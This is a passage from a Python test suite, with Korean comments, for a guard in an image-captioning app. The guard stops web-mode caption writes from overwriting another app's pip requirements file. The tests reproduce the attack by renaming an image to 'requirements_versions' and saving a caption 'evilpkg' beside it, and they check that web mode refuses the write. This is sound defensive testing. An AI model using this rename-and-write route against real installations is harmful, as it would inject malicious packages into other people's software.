        self.assertTrue(saved.get("ok"), saved)
        self.assertEqual((self.output / "00001-1.txt").read_text(encoding="utf-8"), "1girl")

        # 데스크톱 페이지는 신뢰 경계 안 — 앱 폴더 안 데이터셋도 예전처럼 캡션한다
        dataset_image = _image(self.app / "dataset" / "a.png")
        with self._web(False):
            saved = json.loads(self.bridge.saveCaption(json.dumps(
                {"path": str(dataset_image), "caption": "solo"})))
        self.assertTrue(saved.get("ok"), saved)


class CaptionManifestGuardTests(unittest.TestCase):
    """웹 모드의 세 번째 벽(Codex R3 재검토 #0) — 앱 폴더 밖 다른 파이썬 앱의 설치 목록도 지킨다.

    두 번째 벽은 이 앱 설치 폴더만 봐서, 로컬 Forge 폴더에 이미지가 하나 있으면 renameFile 로
    ``requirements_versions`` 로 바꾸고 빈 outDir(이미지 옆)로 saveCaption 해 Forge 가 다음 실행 때
    pip 설치하는 목록을 덮어쓸 수 있었다.
    """

    SECRET = "torch==2.3.1\nsecret-line\n"

    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.root = Path(temp.name)
        self.app = self.root / "Image viewer"
        self.app.mkdir()
        for patcher in (
            mock.patch("core.storage_paths.PROJECT_ROOT", self.app),
            mock.patch("config.OUTPUT_DIR", str(self.app / "generated_images")),
        ):
            patcher.start()
            self.addCleanup(patcher.stop)
        self.bridge = VueBridge()
        _isolate_caption_approvals(self, self.bridge)
        self.forge = self.root / "stable-diffusion-webui-forge"
        self.manifest = self.forge / "requirements_versions.txt"
        self.manifest.parent.mkdir()
        self.manifest.write_bytes(self.SECRET.encode("utf-8"))
        renamed = json.loads(self.bridge.renameFile(
            str(_image(self.forge / "screenshot.png")), "requirements_versions"))
        self.assertTrue(renamed.get("ok"), renamed)
        self.image = Path(renamed["new_path"])

    def _web(self, on: bool):
        return mock.patch.object(VueBridge, "_backend_runtime_is_web_mode", return_value=on)

    def _every_slot(self, image, out_dir=""):
        common = {"path": str(image), "outDir": out_dir}
        loaded = json.loads(self.bridge.loadCaption(json.dumps(common)))
        saved = json.loads(self.bridge.saveCaption(json.dumps({**common, "caption": "evilpkg\n"})))
        try:
            self.bridge._prepare_caption_payload(
                {"files": [str(image)], "engine": "caformer", "save": True, "outDir": out_dir},
                batch=True,
            )
            batch = None
        except ValueError as exc:
            batch = str(exc)
        return {"load": loaded.get("error"), "save": saved.get("error"), "batch": batch}

    def test_web_mode_refuses_a_manifest_sidecar_outside_the_app_folder(self):
        from core.caption_out_dir import MANIFEST_TARGET_MESSAGE

        with self._web(True):
            errors = self._every_slot(self.image)
        self.assertEqual(errors, dict.fromkeys(("load", "save", "batch"), MANIFEST_TARGET_MESSAGE))
        self.assertEqual(self.manifest.read_bytes(), self.SECRET.encode("utf-8"))

    def test_web_mode_refuses_a_manifest_name_in_an_approved_folder_too(self):
        from core.caption_out_dir import MANIFEST_TARGET_MESSAGE

        other = _image(self.root / "dataset" / "requirements_versions.png")
        self.bridge.approve_caption_out_dir(str(self.forge))   # 호스트가 그 폴더를 골라 두었어도
        with self._web(True):
            errors = self._every_slot(other, str(self.forge))
        self.assertEqual(set(errors.values()), {MANIFEST_TARGET_MESSAGE})
        self.assertEqual(self.manifest.read_bytes(), self.SECRET.encode("utf-8"))

    def test_ordinary_sidecars_in_that_folder_and_desktop_mode_are_unchanged(self):
        ordinary = _image(self.forge / "00001-1.png")
        with self._web(True):
            saved = json.loads(self.bridge.saveCaption(json.dumps(
                {"path": str(ordinary), "caption": "1girl"})))
        self.assertTrue(saved.get("ok"), saved)
        self.assertEqual((self.forge / "00001-1.txt").read_text(encoding="utf-8"), "1girl")

        # 데스크톱 페이지는 신뢰 경계 안 — 이름 규칙을 적용하지 않는다
        with self._web(False):
            saved = json.loads(self.bridge.saveCaption(json.dumps(
                {"path": str(self.image), "caption": "solo"})))
        self.assertTrue(saved.get("ok"), saved)
        self.assertEqual(self.manifest.read_text(encoding="utf-8"), "solo")


if __name__ == "__main__":
    unittest.main()
